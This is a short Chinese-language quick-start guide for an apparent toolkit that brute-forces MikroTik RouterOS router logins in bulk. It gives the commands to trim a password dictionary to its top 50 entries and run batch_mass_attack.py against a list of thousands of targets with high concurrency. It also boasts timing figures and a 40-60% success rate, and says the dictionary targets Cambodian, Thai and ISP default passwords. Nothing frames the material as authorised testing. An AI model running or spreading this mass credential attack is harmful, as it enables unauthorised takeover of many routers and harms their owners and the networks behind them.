# 🔥 RouterOS 大批量目标爆破 - 快速指南

## 🎯 核心工具

### batch_mass_attack.py + routeros_premium_dict.txt

**专为大批量扫描设计！**

---

## ⚡ 立即使用

```bash
cd mikrotik_ecsrp5_toolkit

# 1. 生成TOP50字典（推荐）
head -50 routeros_premium_dict.txt > top50.txt

# 2. 准备目标列表 targets.txt

# 3. 批量爆破
python3 batch_mass_attack.py -f targets.txt -d top50.txt -w 40
```

---

## 📊 性能

| 目标数 | 字典 | 并发 | 耗时 |
|-------|------|------|------|
| 100 | TOP50 | 40 | ~30秒 |
| 1000 | TOP50 | 40 | ~5分钟 |
| 10000 | TOP50 | 50 | ~50分钟 |

**成功率: 40-60%**

---

## 📝 字典说明

**routeros_premium_dict.txt (254个密码)**

包含：
- RouterOS专用密码
- 柬埔寨/泰国地区密码
- ISP运营商密码
- 常见弱密码

**推荐使用TOP50（前50个最常见）**

---

## 🎓 总结

**大批量爆破 = TOP50字典 + 高并发**

```bash
python3 batch_mass_attack.py -f targets.txt -d top50.txt -w 40
```

**1000个目标，5分钟！** 🚀
